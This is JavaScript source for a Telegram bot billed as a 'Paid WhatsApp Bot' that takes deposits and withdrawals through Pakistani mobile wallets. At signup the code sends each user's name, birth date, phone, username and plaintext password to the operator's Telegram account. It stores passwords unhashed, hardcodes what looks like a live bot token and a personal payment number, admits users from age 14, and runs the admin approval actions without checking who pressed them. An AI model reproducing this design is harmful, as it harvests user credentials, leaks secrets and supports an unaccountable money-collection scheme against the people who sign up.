const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');

// ===== BOT =====
const bot = new Telegraf('8226474686:AAEmXiWRGoeaa5pZpF2MZlYViYmSkM70fbI');
const ADMIN_ID = 6012422087;

// ===== DATABASE =====
const DATA_FILE = './users.json';
let users = {};

if (fs.existsSync(DATA_FILE)) {
    users = JSON.parse(fs.readFileSync(DATA_FILE));
}

function saveUsers() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
}

const sessions = {};
const PASSWORD_REGEX = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;

// ===== DATE & TIME (Pakistan Time) =====
function getCurrentDateTime() {
    const d = new Date();
    const utc = d.getTime() + d.getTimezoneOffset() * 60000;
    const pakistanTime = new Date(utc + 5 * 60 * 60 * 1000);

    const date = `${String(pakistanTime.getDate()).padStart(2,'0')}-${String(pakistanTime.getMonth()+1).padStart(2,'0')}-${pakistanTime.getFullYear()}`;
    const time = `${String(pakistanTime.getHours()).padStart(2,'0')}:${String(pakistanTime.getMinutes()).padStart(2,'0')}:${String(pakistanTime.getSeconds()).padStart(2,'0')}`;

    return { date, time };
}

// ======= Back Button Helper =======
function withBackButton(buttons = []) {
    return Markup.inlineKeyboard([
        ...buttons,
        [Markup.button.callback('⬅️ Back', 'backToMenu')]
    ]);
}

// ======= Generate Unique IDs =======
function generateDepositId() {
    return 'dep_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
}

function generateWithdrawId() {
    return 'wd_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
}

// ======= START =======
bot.start(async (ctx) => {
    const chatId = ctx.chat.id;
    const session = sessions[chatId];

    if (session && session.usernameKey && users[session.usernameKey]) {
        const user = users[session.usernameKey];
        return ctx.reply(
            `Dear ${user.firstName}, Welcome Back To Paid WhatsApp Bot`,
            withBackButton([
                [Markup.button.callback('Check Balance', 'checkBalance')],
                [Markup.button.callback('Buy Bot', 'buyBot')],
                [Markup.button.callback('Deposit Balance', 'depositBalance')],
                [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
                [Markup.button.callback('Log Out', 'logOut')]
            ])
        );
    }

    await ctx.reply(
        '👋 Welcome!\n\nPlease Sign Up or Log In:',
        Markup.inlineKeyboard([
            Markup.button.callback('Sign Up', 'signup'),
            Markup.button.callback('Log In', 'login')
        ])
    );
});

// ======= BUTTON ACTIONS =======
bot.action('signup', async (ctx) => {
    sessions[ctx.chat.id] = { flow: 'signup', step: 'firstName' };
    await ctx.reply('Enter your first name:');
});

bot.action('login', async (ctx) => {
    sessions[ctx.chat.id] = { flow: 'login', step: 'loginUsername' };
    await ctx.reply('Enter your username:');
});

bot.action('forgotPassword', async (ctx) => {
    await ctx.reply('Password recovery not supported.\nPlease create a new account.');
});

// ======= TEXT HANDLER =======
bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    const text = ctx.message.text.trim();
    const session = sessions[chatId];
    if (!session) return;

    // ===== SIGNUP FLOW =====
    if (session.flow === 'signup') {
        switch (session.step) {
            case 'firstName':
                session.firstName = text;
                session.step = 'dob';
                return ctx.reply('Enter DOB (DD-MM-YYYY):');

            case 'dob': {
                const m = text.match(/^(\d{2})-(\d{2})-(\d{4})$/);
                if (!m) return ctx.reply('Invalid format. Example: 31-01-2000');
                const d = new Date(+m[3], +m[2] - 1, +m[1]);
                if (d.getDate() !== +m[1]) return ctx.reply('Invalid date.');

                const age = new Date().getFullYear() - d.getFullYear();
                if (age < 14 || age > 55) return ctx.reply('Age must be between 14 and 55.');

                session.dob = text;
                session.step = 'phone';
                return ctx.reply('Enter phone with country code (+923001234567):');
            }

            case 'phone': {
                if (!/^\+?[1-9]\d{9,14}$/.test(text)) {
                    return ctx.reply('Invalid phone number.');
                }
                session.phone = text;
                session.step = 'username';
                return ctx.reply('Create username (lowercase letters, numbers, underscore):');
            }

            case 'username':
                if (!/^[a-z0-9_]{3,15}$/.test(text)) {
                    return ctx.reply('Invalid username format. Example: wasi123');
                }
                if (users[text]) return ctx.reply('Already Taken. Try Another.');
                session.username = text;
                session.step = 'password';
                return ctx.reply('Enter your password (8+ chars, uppercase, lowercase, number):');

            case 'password':
                if (!PASSWORD_REGEX.test(text)) return ctx.reply('Weak password. Try again.');
                session.password = text;
                session.step = 'confirmPassword';
                return ctx.reply('Confirm password:');

            case 'confirmPassword':
                if (text !== session.password) {
                    session.step = 'password';
                    return ctx.reply('Passwords do not match. Enter again:');
                }

                users[session.username] = {
                    firstName: session.firstName,
                    dob: session.dob,
                    phone: session.phone,
                    password: session.password,
                    registered: getCurrentDateTime().date,
                    balance: 0,
                    transactions: [],
                    pendingWithdrawals: []
                };
                saveUsers();
                sessions[chatId] = null;

                await ctx.reply(
                    '🎉 Account Created Successfully',
                    Markup.inlineKeyboard([[Markup.button.callback('Log In', 'login')]])
                );

                const { date, time } = getCurrentDateTime();
                const adminMsg = `
🆕 NEW ACCOUNT
👤 Name: ${session.firstName} 🎂 DOB: ${session.dob} 📞 Phone: ${session.phone} 👤 Username: ${session.username} 🔑 Password: ${session.password} 📅 Date: ${date} Time: ${time}
📲 Telegram: @${ctx.from.username || 'Not Set'} [https://t.me/${ctx.from.username || 'user?id=' + chatId}]
`;
                await bot.telegram.sendMessage(ADMIN_ID, adminMsg);
                break;
        }
        return;
    }

    // ===== LOGIN FLOW =====
    if (session.flow === 'login') {
        switch (session.step) {
            case 'loginUsername':
                if (!users[text]) {
                    return ctx.reply(
                        'Username not found.',
                        Markup.inlineKeyboard([
                            [Markup.button.callback('Sign Up', 'signup')],
                            [Markup.button.callback('⬅️ Back', 'backToMenu')]
                        ])
                    );
                }
                session.user = users[text];
                session.usernameKey = text;
                session.step = 'loginPassword';
                return ctx.reply('Enter password:');

            case 'loginPassword':
                if (text !== session.user.password) return ctx.reply('Incorrect password.');

                sessions[chatId] = { user: session.user, usernameKey: session.usernameKey };

                return ctx.reply(
                    `Dear ${session.user.firstName}, Welcome To Paid WhatsApp Bot`,
                    withBackButton([
                        [Markup.button.callback('Check Balance', 'checkBalance')],
                        [Markup.button.callback('Buy Bot', 'buyBot')],
                        [Markup.button.callback('Deposit Balance', 'depositBalance')],
                        [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
                        [Markup.button.callback('Log Out', 'logOut')]
                    ])
                );
        }
        return;
    }

    // ======= DEPOSIT FLOW =======
    if (session.flow === 'deposit') {
        // Step 1: Enter Amount
        if (session.step === 'enterAmount') {
            const amount = parseInt(text);

            if (isNaN(amount)) {
                return ctx.reply('❌ Please enter numbers only.');
            }

            if (amount < 100 || amount > 5000) {
                return ctx.reply('❌ Amount must be between 100 PKR and 5000 PKR.');
            }

            session.depositAmount = amount;
            session.step = 'awaitProof';

            return ctx.reply(
`📤 Payment of ${amount} PKR is noted for upgrade your funds.

Please send your payment proof Only TiD , TrX ID , Transaction ID (Screenshot ❌)`
            );
        }

        // Step 2: Await Proof
        if (session.step === 'awaitProof') {
            const user = users[session.usernameKey];
            const { date, time } = getCurrentDateTime();

            await ctx.reply('⏳ Please wait, your fund updating in process...', withBackButton([]));

            const proofText = ctx.message.text || 'Sent proof';
            if (!session.pendingDeposits) session.pendingDeposits = [];
            const depositId = generateDepositId();

            session.pendingDeposits.push({
                id: depositId,
                amount: session.depositAmount,
                proof: proofText,
                method: session.depositMethod
            });

            const adminMsg = `
💰 Deposit Request
👤 User: ${user.firstName} (Username: ${session.usernameKey})
💵 Amount: ${session.depositAmount} PKR
📅 Date: ${date} Time: ${time}
🖼 Proof: ${proofText}
`;

            await bot.telegram.sendMessage(
                ADMIN_ID,
                adminMsg,
                Markup.inlineKeyboard([
                    Markup.button.callback('✅ Approve', `approve_${ctx.chat.id}_${depositId}`),
                    Markup.button.callback('❌ Reject', `reject_${ctx.chat.id}_${depositId}`)
                ])
            );

            session.step = null; // wait for admin
            return;
        }
    }

    // ======= WITHDRAW FLOW =======
    if (session.flow === 'withdraw') {
        const user = users[session.usernameKey];
        
        // Step 1: Enter Amount
        if (session.step === 'enterAmount') {
            const amount = parseInt(text);

            if (isNaN(amount)) {
                return ctx.reply('❌ Please enter numbers only.');
            }

            if (amount < 200) {
                return ctx.reply('❌ Minimum withdrawal amount is 200 PKR.');
            }

            if (amount > 5000) {
                return ctx.reply('❌ Maximum withdrawal amount is 5000 PKR per transaction.');
            }

            if (amount > user.balance) {
                return ctx.reply(`❌ Insufficient balance. Your balance is ${user.balance} PKR.`);
            }

            // Check daily withdrawal limit
            const today = getCurrentDateTime().date;
            if (!user.dailyWithdrawals) user.dailyWithdrawals = { date: today, count: 0, amount: 0 };
            
            if (user.dailyWithdrawals.date !== today) {
                user.dailyWithdrawals = { date: today, count: 0, amount: 0 };
            }

            if (user.dailyWithdrawals.count >= 3) {
                return ctx.reply('❌ Daily withdrawal limit (3 transactions) reached. Try again tomorrow.');
            }

            session.withdrawAmount = amount;
            session.step = 'selectMethod';
            
            return ctx.reply(
                `✅ Amount ${amount} PKR noted.\n\n🏦 Select payment method for withdrawal:`,
                Markup.inlineKeyboard([
                    [Markup.button.callback('✈️ JazzCash', 'withdrawJazzCash')],
                    [Markup.button.callback('🏦 EasyPaisa', 'withdrawEasyPaisa')],
                    [Markup.button.callback('💳 U-Paisa', 'withdrawUPaisa')],
                    [Markup.button.callback('⬅️ Back', 'backToMenu')]
                ])
            );
        }

        // Step 3: Enter Account Number (after method selection)
        if (session.step === 'enterAccountNumber') {
            const accountNumber = text.trim();
            
            // Validate Pakistan mobile number
            if (!/^03\d{9}$/.test(accountNumber)) {
                return ctx.reply('❌ Invalid account number. Must be 11 digits starting with 03 (e.g., 03001234567).');
            }

            session.withdrawAccount = accountNumber;
            session.step = 'confirmation';

            const processingFee = Math.max(10, Math.floor(session.withdrawAmount * 0.02)); // 2% or min 10 PKR
            const netAmount = session.withdrawAmount - processingFee;

            return ctx.reply(
                `📋 Withdraw Request Summary:\n\n` +
                `💰 Amount: ${session.withdrawAmount} PKR\n` +
                `📉 Processing Fee: ${processingFee} PKR (2%)\n` +
                `💵 Net Amount: ${netAmount} PKR\n` +
                `🏦 Method: ${session.withdrawMethod}\n` +
                `📱 Account: ${accountNumber}\n\n` +
                `Are you sure you want to proceed?`,
                Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Confirm Withdraw', 'confirmWithdraw')],
                    [Markup.button.callback('❌ Cancel', 'cancelWithdraw')]
                ])
            );
        }
    }
});

// ===== BUTTON ACTIONS =====

// --- Check Balance + View Transactions
bot.action('checkBalance', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const { date, time } = getCurrentDateTime();

    return ctx.reply(
        `Dear Customer, Your Account Balance Is: ${user.balance || 0} PKR On Account: ${user.firstName} Date: ${date} Time: ${time}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📜 View Transaction History', 'viewTransactions')],
            [Markup.button.callback('⬅️ Back', 'backToMenu')]
        ])
    );
});

// --- Deposit Balance (Select Payment Method)
bot.action('depositBalance', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    sessions[ctx.chat.id].flow = 'deposit';
    sessions[ctx.chat.id].step = null;

    await ctx.reply(
        'Select Your Payment Deposit Method:',
        Markup.inlineKeyboard([
            [Markup.button.callback('✈️ JazzCash', 'depositJazzCash')],
            [Markup.button.callback('🏦 EasyPaisa', 'depositEasyPaisa')],
            [Markup.button.callback('💳 U-Paisa', 'depositUPaisa')],
            [Markup.button.callback('⬅️ Back', 'backToMenu')]
        ])
    );
});

// ===== Deposit Payment Method Selected =====
bot.action(/deposit(JazzCash|EasyPaisa|UPaisa)/, async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const method = ctx.match[1];
    session.depositMethod = method;
    session.flow = 'deposit';
    session.step = 'enterAmount';

    const accountType = method === 'UPaisa' ? 'U-Paisa' : method;

    await ctx.reply(
`💰 You selected ${accountType}. Please send payment to:

Account Title: M Hadi
Account Number: 03000382844
Account Type: ${accountType}`
    );

    await ctx.reply('💵 Enter your amount you are sending (PKR):');
});

// --- Withdraw Balance (NEW IMPLEMENTATION)
bot.action('withdrawBalance', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    
    // Check minimum balance
    if (user.balance < 200) {
        return ctx.reply('❌ Minimum balance required for withdrawal is 200 PKR.', withBackButton([]));
    }

    sessions[ctx.chat.id].flow = 'withdraw';
    sessions[ctx.chat.id].step = 'enterAmount';

    return ctx.reply(
        `💰 Your current balance: ${user.balance} PKR\n\n` +
        `💵 Enter amount to withdraw:\n` +
        `• Minimum: 200 PKR\n` +
        `• Maximum: 5000 PKR\n` +
        `• Daily Limit: 3 transactions`,
        withBackButton([])
    );
});

// ===== Withdraw Payment Method Selected =====
bot.action(/withdraw(JazzCash|EasyPaisa|UPaisa)/, async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const method = ctx.match[1];
    session.withdrawMethod = method;
    session.step = 'enterAccountNumber';

    const accountType = method === 'UPaisa' ? 'U-Paisa' : method;
    
    return ctx.reply(
        `🏦 You selected ${accountType} for withdrawal.\n\n` +
        `📱 Enter your ${accountType} account number (11 digits, e.g., 03001234567):`
    );
});

// --- Confirm Withdraw
bot.action('confirmWithdraw', async (ctx) => {
    const chatId = ctx.chat.id;
    const session = sessions[chatId];
    if (!session || !session.usernameKey) return ctx.answerCbQuery('Session expired.');

    const user = users[session.usernameKey];
    const { date, time } = getCurrentDateTime();
    
    // Calculate processing fee
    const processingFee = Math.max(10, Math.floor(session.withdrawAmount * 0.02));
    const netAmount = session.withdrawAmount - processingFee;
    
    // Generate unique withdraw ID
    const withdrawId = generateWithdrawId();
    
    // Hold the amount temporarily
    user.balance -= session.withdrawAmount;
    
    // Add to pending withdrawals
    if (!user.pendingWithdrawals) user.pendingWithdrawals = [];
    user.pendingWithdrawals.push({
        id: withdrawId,
        amount: session.withdrawAmount,
        netAmount: netAmount,
        fee: processingFee,
        method: session.withdrawMethod,
        account: session.withdrawAccount,
        date: date,
        time: time,
        status: 'pending'
    });
    
    // Update daily withdrawal count
    if (!user.dailyWithdrawals) user.dailyWithdrawals = { date: date, count: 0, amount: 0 };
    user.dailyWithdrawals.count += 1;
    user.dailyWithdrawals.amount += session.withdrawAmount;
    
    saveUsers();
    
    // Send notification to admin
    const adminMsg = `
💸 WITHDRAWAL REQUEST
👤 User: ${user.firstName} (${session.usernameKey})
💰 Amount: ${session.withdrawAmount} PKR
📉 Fee: ${processingFee} PKR
💵 Net: ${netAmount} PKR
🏦 Method: ${session.withdrawMethod}
📱 Account: ${session.withdrawAccount}
📅 Date: ${date} ⏰ Time: ${time}
💳 Balance: ${user.balance} PKR
📊 Daily: ${user.dailyWithdrawals.count}/3 withdrawals
    `;
    
    await bot.telegram.sendMessage(
        ADMIN_ID,
        adminMsg,
        Markup.inlineKeyboard([
            [Markup.button.callback('✅ Approve & Send', `admin_approve_${chatId}_${withdrawId}`)],
            [Markup.button.callback('❌ Reject', `admin_reject_${chatId}_${withdrawId}`)]
        ])
    );
    
    // Notify user
    await ctx.reply(
        `⏳ Withdrawal request submitted!\n\n` +
        `📋 Details:\n` +
        `• Amount: ${session.withdrawAmount} PKR\n` +
        `• Fee: ${processingFee} PKR\n` +
        `• Net: ${netAmount} PKR\n` +
        `• Method: ${session.withdrawMethod}\n` +
        `• Account: ${session.withdrawAccount}\n` +
        `• Status: Pending Admin Approval\n\n` +
        `Request ID: ${withdrawId}\n` +
        `You will be notified once processed.`,
        withBackButton([])
    );
    
    // Reset session
    sessions[chatId].flow = null;
    sessions[chatId].step = null;
    delete session.withdrawAmount;
    delete session.withdrawMethod;
    delete session.withdrawAccount;
});

// --- Cancel Withdraw
bot.action('cancelWithdraw', async (ctx) => {
    const session = sessions[ctx.chat.id];
    sessions[ctx.chat.id].flow = null;
    sessions[ctx.chat.id].step = null;
    
    await ctx.reply('❌ Withdrawal request cancelled.', withBackButton([]));
});

// --- Buy Bot (deduct 100 PKR)
bot.action('buyBot', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const cost = 100;
    if ((user.balance || 0) < cost) return ctx.reply(`❌ Not Enough Balance To Buy Bot (Cost: ${cost} PKR)`, withBackButton([]));

    user.balance -= cost;
    if (!user.transactions) user.transactions = [];
    const { date, time } = getCurrentDateTime();
    user.transactions.push({ type: 'Buy Bot ➖', amount: cost, date, time });

    saveUsers();
    return ctx.reply(`✅ Bot Purchased! ${cost} PKR Deducted`, withBackButton([]));
});

// --- View Transaction History
bot.action('viewTransactions', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    if (!user.transactions || user.transactions.length === 0) return ctx.reply('No transactions found.', withBackButton([]));

    let historyMsg = '📜 Transaction History:\n\n';
    user.transactions.forEach((t, i) => {
        historyMsg += `${i + 1}. ${t.type}: ${t.amount} PKR on ${t.date} at ${t.time}\n`;
    });

    // Show pending withdrawals if any
    if (user.pendingWithdrawals && user.pendingWithdrawals.length > 0) {
        historyMsg += '\n⏳ Pending Withdrawals:\n';
        user.pendingWithdrawals.forEach((w, i) => {
            historyMsg += `${i + 1}. ${w.amount} PKR to ${w.account} (${w.method}) - ${w.status}\n`;
        });
    }

    return ctx.reply(historyMsg, withBackButton([]));
});

// --- Log Out
bot.action('logOut', async (ctx) => {
    sessions[ctx.chat.id] = null;
    return ctx.reply('🔓 You have been logged out.', withBackButton([]));
});

// ======= BACK BUTTON =====
bot.action('backToMenu', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) {
        return ctx.reply(
            '👋 Welcome!\n\nPlease Sign Up or Log In:',
            Markup.inlineKeyboard([
                Markup.button.callback('Sign Up', 'signup'),
                Markup.button.callback('Log In', 'login')
            ])
        );
    } else {
        const user = users[session.usernameKey];
        return ctx.reply(
            `Dear ${user.firstName}, Welcome To Paid WhatsApp Bot`,
            withBackButton([
                [Markup.button.callback('Check Balance', 'checkBalance')],
                [Markup.button.callback('Buy Bot', 'buyBot')],
                [Markup.button.callback('Deposit Balance', 'depositBalance')],
                [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
                [Markup.button.callback('Log Out', 'logOut')]
            ])
        );
    }
});

// ======= ADMIN APPROVAL FOR DEPOSITS =======
bot.action(/approve_(\d+)_(dep_\d+_\d+)/, async (ctx) => {
    const [_, userChatId, depositId] = ctx.match;
    const session = sessions[userChatId];
    if (!session || !session.pendingDeposits) return ctx.answerCbQuery('No pending deposit.');

    const deposit = session.pendingDeposits.find(d => d.id === depositId);
    if (!deposit) return ctx.answerCbQuery('Deposit already processed.');

    const user = users[session.usernameKey];
    const { date, time } = getCurrentDateTime();

    user.balance = (user.balance || 0) + deposit.amount;
    if (!user.transactions) user.transactions = [];
    user.transactions.push({
        type: `Deposit ➕ (${deposit.method || 'N/A'})`,
        amount: deposit.amount,
        date,
        time,
        proof: deposit.proof
    });
    saveUsers();

    await bot.telegram.sendMessage(userChatId, `✅ Your fund of ${deposit.amount} PKR has been approved!`, withBackButton([]));

    // remove processed deposit
    session.pendingDeposits = session.pendingDeposits.filter(d => d.id !== depositId);

    await ctx.editMessageText('✅ Deposit Approved ✅');
});

bot.action(/reject_(\d+)_(dep_\d+_\d+)/, async (ctx) => {
    const [_, userChatId, depositId] = ctx.match;
    const session = sessions[userChatId];
    if (!session || !session.pendingDeposits) return ctx.answerCbQuery('No pending deposit.');

    const deposit = session.pendingDeposits.find(d => d.id === depositId);
    if (!deposit) return ctx.answerCbQuery('Deposit already processed.');

    await bot.telegram.sendMessage(userChatId, `❌ Your deposit of ${deposit.amount} PKR has been rejected.`, withBackButton([]));

    // remove processed deposit
    session.pendingDeposits = session.pendingDeposits.filter(d => d.id !== depositId);

    await ctx.editMessageText('❌ Deposit Rejected ❌');
});

// ======= ADMIN APPROVAL FOR WITHDRAWALS =======
bot.action(/admin_approve_(\d+)_(wd_\d+_\d+)/, async (ctx) => {
    const [_, userChatId, withdrawId] = ctx.match;
    const session = sessions[userChatId];
    if (!session || !session.usernameKey) return ctx.answerCbQuery('User not found.');

    const user = users[session.usernameKey];
    if (!user.pendingWithdrawals) return ctx.answerCbQuery('No pending withdrawals.');

    const withdrawIndex = user.pendingWithdrawals.findIndex(w => w.id === withdrawId);
    if (withdrawIndex === -1) return ctx.answerCbQuery('Withdrawal already processed.');

    const withdraw = user.pendingWithdrawals[withdrawIndex];
    const { date, time } = getCurrentDateTime();

    // Update withdrawal status
    withdraw.status = 'approved';
    withdraw.approvedDate = date;
    withdraw.approvedTime = time;

    // Add to transaction history
    if (!user.transactions) user.transactions = [];
    user.transactions.push({
        type: `Withdrawal ➖ (${withdraw.method})`,
        amount: withdraw.amount,
        netAmount: withdraw.netAmount,
        fee: withdraw.fee,
        date: date,
        time: time,
        account: withdraw.account,
        status: 'approved'
    });

    saveUsers();

    // Notify user
    await bot.telegram.sendMessage(
        userChatId,
        `✅ Withdrawal Approved!\n\n` +
        `💰 Amount: ${withdraw.amount} PKR\n` +
        `📉 Fee: ${withdraw.fee} PKR\n` +
        `💵 Net Sent: ${withdraw.netAmount} PKR\n` +
        `🏦 To: ${withdraw.account} (${withdraw.method})\n` +
        `📅 Date: ${date} at ${time}\n\n` +
        `Your funds have been sent to your account.`,
        withBackButton([])
    );

    // Remove from pending
    user.pendingWithdrawals.splice(withdrawIndex, 1);
    saveUsers();

    await ctx.editMessageText(`✅ Withdrawal Approved & Amount Sent\n\nUser: ${user.firstName}\nAmount: ${withdraw.netAmount} PKR`);
});

bot.action(/admin_reject_(\d+)_(wd_\d+_\d+)/, async (ctx) => {
    const [_, userChatId, withdrawId] = ctx.match;
    const session = sessions[userChatId];
    if (!session || !session.usernameKey) return ctx.answerCbQuery('User not found.');

    const user = users[session.usernameKey];
    if (!user.pendingWithdrawals) return ctx.answerCbQuery('No pending withdrawals.');

    const withdrawIndex = user.pendingWithdrawals.findIndex(w => w.id === withdrawId);
    if (withdrawIndex === -1) return ctx.answerCbQuery('Withdrawal already processed.');

    const withdraw = user.pendingWithdrawals[withdrawIndex];
    const { date, time } = getCurrentDateTime();

    // Return balance to user
    user.balance += withdraw.amount;
    
    // Update daily withdrawal count
    if (user.dailyWithdrawals) {
        user.dailyWithdrawals.count = Math.max(0, user.dailyWithdrawals.count - 1);
        user.dailyWithdrawals.amount = Math.max(0, user.dailyWithdrawals.amount - withdraw.amount);
    }

    // Add to transaction history
    if (!user.transactions) user.transactions = [];
    user.transactions.push({
        type: `Withdrawal ❌ (Rejected)`,
        amount: withdraw.amount,
        date: date,
        time: time,
        account: withdraw.account,
        status: 'rejected',
        reason: 'Admin rejected'
    });

    // Notify user
    await bot.telegram.sendMessage(
        userChatId,
        `❌ Withdrawal Rejected!\n\n` +
        `💰 Amount: ${withdraw.amount} PKR\n` +
        `🏦 Method: ${withdraw.method}\n` +
        `📱 Account: ${withdraw.account}\n` +
        `📅 Date: ${date} at ${time}\n\n` +
        `Your balance has been restored.\n` +
        `Current Balance: ${user.balance} PKR`,
        withBackButton([])
    );

    // Remove from pending
    user.pendingWithdrawals.splice(withdrawIndex, 1);
    saveUsers();

    await ctx.editMessageText(`❌ Withdrawal Rejected\n\nUser: ${user.firstName}\nAmount: ${withdraw.amount} PKR returned to balance.`);
});

// ===== LAUNCH =====
bot.launch();
console.log('Bot running...');
